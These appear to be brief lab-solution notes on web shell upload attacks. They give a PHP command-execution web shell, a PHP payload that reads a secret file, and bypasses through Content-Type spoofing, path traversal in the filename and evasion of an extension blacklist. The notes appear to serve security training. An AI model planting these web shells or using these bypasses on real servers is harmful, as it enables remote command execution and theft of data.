**Web shell upload via Content-Type restriction bypass**
```c
<?php echo system($_GET["cmd"]); ?>
```
```css
Web shell upload via Content-Type restriction bypass
Change the content-type to required file and we can upload our shell

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

```python
Web shell upload via path traversal
Change the path of the file from filename="exploit.php" To filename="../exploit.php" or "..%2fexploit.php"
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

```
Web shell upload via extension blacklist bypass
<?php echo file_get_contents('/home/carlos/secret'); ?>

```
